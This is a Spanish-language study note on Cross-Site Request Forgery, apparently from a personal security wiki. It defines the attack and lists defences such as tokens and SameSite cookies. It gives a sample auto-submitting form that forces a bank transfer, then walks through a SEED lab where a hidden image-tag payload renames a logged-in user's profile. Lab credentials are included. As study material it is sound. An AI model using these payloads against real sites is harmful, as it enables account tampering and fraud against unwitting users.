# Cross-Site Request Forgery (CSRF)

## ¿Qué es CSRF?

El **Cross-Site Request Forgery (CSRF)** es una vulnerabilidad en la que un atacante engaña a un usuario legítimo para que realice una **acción no deseada** en una aplicación web donde ya está autenticado.  
El ataque aprovecha que el navegador del usuario **automáticamente envía las cookies** de sesión a la aplicación web, sin que el usuario se dé cuenta.

## ¿Cómo ocurre?

1. El usuario está autenticado en una web (por ejemplo, su banco en línea).
    
2. Sin cerrar sesión, el usuario visita un sitio web malicioso.
    
3. El sitio malicioso **envía una solicitud HTTP** al sitio legítimo utilizando la sesión activa del usuario.
    
4. Como el navegador incluye automáticamente las cookies, el sitio legítimo procesa la solicitud **como si fuera legítima**.
    

## Ejemplo realista

Un atacante crea una página maliciosa que fuerza a un usuario autenticado a realizar una **transferencia bancaria** sin su consentimiento.

```html
<!-- Página maliciosa -->
<html>
  <body>
    <h1>¡Oferta exclusiva! ¡Haz clic aquí!</h1>
    <form action="https://banco-victima.com/transferir" method="POST">
      <input type="hidden" name="destinatario" value="cuenta-atacante">
      <input type="hidden" name="cantidad" value="1000">
      <input type="submit" value="Gana un premio">
    </form>

    <script>
      document.forms[0].submit(); // Envía automáticamente el formulario
    </script>
  </body>
</html>
```

> Si el usuario está autenticado en `banco-victima.com`, al visitar esta página, se enviará una transferencia de **1000 unidades** a la cuenta del atacante **sin que el usuario se entere**.

## ¿Qué acciones podría forzar un atacante?

- Transferir dinero
    
- Cambiar el correo electrónico o contraseña
    
- Eliminar cuentas o datos importantes
    
- Escalar privilegios o dar permisos a un atacante
    

## ¿Cómo prevenir CSRF?

- **Tokens CSRF**: Incluir un **token aleatorio y único** en cada formulario y solicitud. El servidor valida que este token sea correcto.
    
- **Cabeceras personalizadas**: Usar cabeceras que el navegador no envía automáticamente, para que el atacante no pueda replicarlas.
    
- **SameSite Cookies**: Configurar las cookies de sesión con la propiedad `SameSite=Strict` o `SameSite=Lax` para limitar el envío de cookies a solicitudes del mismo origen.
    
- **Verificación de origen**: Revisar la cabecera `Origin` o `Referer` para confirmar que la solicitud viene del sitio legítimo.
    

---
# Secuencia del ataque

Vamos a desglosar paso a paso como sería un ataque de *CSRF*

## Paso 1 - Despliegue del laboratorio

[Laboratorio CSRF:](https://seedsecuritylabs.org/Labs_20.04/Files/Web_CSRF_Elgg/Labsetup.zip)


Acción: 

```Shell
wget https://seedsecuritylabs.org/Labs_20.04/Files/Web_CSRF_Elgg/Labsetup.zip
unzip Labsetup.zip
rm !$
cd Labsetup
docker-compose up -d
```

Resultado: 

```Shell
attacker  docker-compose.yml  image_attacker  image_mysql  image_www
```

Explicación:  descargamos a nuestra máquina local este laboratorio, descomprimimos y accedemos a la carpeta descargada para iniciar el [Docker](../../Herramientas/Docker) 

## Paso 2 -

Acción: 

```Shell
nvim /etc/hosts
```

Resultado:

```lua
# Host addresses
127.0.0.1  localhost
127.0.1.1  parrot
::1        localhost ip6-localhost ip6-loopback
ff02::1    ip6-allnodes
ff02::2    ip6-allrouters
# Others

# Docker

10.9.0.5  www.seed-server.com
10.9.0.5  www.example32.com
10.9.0.105  www.attacker32.com
```

Explicación:  añadimos al `/etc/hosts` los dominios asociados al contenedor

**Nota:** tenemos por defecto estas dos credenciales:

```txt
alice:seedalice
samy:seedsamy
```

## Paso 3 -

Acción: en BurpSuite, pasamos la solicitud de POST a GET, y teniendo en cuenta el identificador de usuario (en este caso alice es el 56) escribimos este mensaje en un campo que interpreta html y lo que hacemos es que se crea una imagen (que añadimos algunos valores de altura y ancho con width y height), de esta forma alice al entrar al mensaje no vera nada raro pero estará tramitando el cambio de nombre de usuario

```txt
<img src="http://www.seed.server.com/action/profile/edit?name=Hacked&description=&accesslevel%5bdescription%5d=2&briefdescription=&accesslevel%5bbriefdescription%5d=2&location=&accesslevel%5blocation%5d=2&interests=&accesslevel%5binterests%5d=2&skills=&accesslevel%5bskills%5d=2&contactemail=&accesslevel%5bcontactemail%5d=2&phone=&accesslevel%5bphone%5d=2&mobile=&accesslevel%5bmobile%5d=2&website=&accesslevel%5bwebsite%5d=2&twitter=&accesslevel%5btwitter%5d=2&guid=56" alt="image" width="1" height="1"/>
```

Explicación:  con este payload a través de [Burp Suite](../../Herramientas/Burp%20Suite) podemos realizar la acción maliciosa de hacer que el usuario que recibe este mensaje modifique su nombre de usuario.
